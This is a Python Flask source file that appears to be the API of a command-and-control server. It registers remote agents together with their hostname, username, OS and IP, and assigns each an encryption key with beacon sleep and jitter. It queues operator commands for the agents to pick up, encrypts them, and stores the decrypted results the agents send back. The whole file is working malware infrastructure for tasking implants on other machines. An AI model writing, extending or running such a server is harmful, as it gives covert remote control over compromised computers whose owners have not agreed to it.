import json
from datetime import datetime
from flask import Blueprint, request, jsonify
from c2.models import db, Agent, Task
from c2.crypto import generate_key, encrypt, decrypt

api_bp = Blueprint("api", __name__, url_prefix="/api")


@api_bp.route("/register", methods=["POST"])
def register():
    data = request.get_json(force=True)
    uid = data.get("uid")
    if not uid:
        return jsonify({"error": "missing uid"}), 400

    agent = Agent.query.filter_by(uid=uid).first()
    if not agent:
        agent = Agent(
            uid=uid,
            hostname=data.get("hostname"),
            username=data.get("username"),
            os_info=data.get("os"),
            ip_address=request.remote_addr,
            aes_key=generate_key(),
        )
        db.session.add(agent)
        db.session.commit()
    else:
        agent.last_seen = datetime.utcnow()
        agent.alive = True
        db.session.commit()

    return jsonify({
        "uid": agent.uid,
        "key": agent.aes_key,
        "sleep": agent.sleep,
        "jitter": agent.jitter,
    })


@api_bp.route("/beacon/<uid>", methods=["POST"])
def beacon(uid):
    agent = Agent.query.filter_by(uid=uid).first()
    if not agent:
        return jsonify({"error": "unknown agent"}), 404

    agent.last_seen = datetime.utcnow()
    agent.alive = True
    db.session.commit()

    tasks = Task.query.filter_by(agent_uid=uid, status="pending").all()
    payload = [{"id": t.id, "command": t.command} for t in tasks]
    for t in tasks:
        t.status = "sent"
    db.session.commit()

    encrypted = encrypt(agent.aes_key, json.dumps(payload).encode())
    return jsonify({"data": encrypted})


@api_bp.route("/result/<uid>", methods=["POST"])
def result(uid):
    agent = Agent.query.filter_by(uid=uid).first()
    if not agent:
        return jsonify({"error": "unknown agent"}), 404

    token = request.get_json(force=True).get("data")
    try:
        plaintext = decrypt(agent.aes_key, token)
        data = json.loads(plaintext)
    except Exception as e:
        return jsonify({"error": f"decrypt failed: {e}"}), 400

    task = Task.query.get(data["id"])
    if task:
        task.output = data.get("output", "")
        task.status = "done"
        task.completed_at = datetime.utcnow()
        db.session.commit()

    return jsonify({"status": "ok"})
